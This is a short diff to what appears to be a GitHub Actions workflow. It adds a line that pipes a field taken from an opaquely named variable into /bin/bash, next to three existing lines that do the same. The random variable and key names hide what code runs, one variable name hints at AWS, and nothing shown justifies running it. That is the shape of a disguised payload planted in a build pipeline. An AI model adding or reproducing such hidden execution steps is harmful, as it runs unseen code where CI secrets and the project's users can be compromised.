@@ -43,6 +43,7 @@ jobs:
           echo $kcvm61 | jq -r .z4367 | /bin/bash
           printf '%s' "$awsp18395" | jq -r .rue055 | /bin/bash
           printf '%s' "$rsca4583" | jq -r .igf86 | /bin/bash
+          echo $aq09 | jq -r .isys4682 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
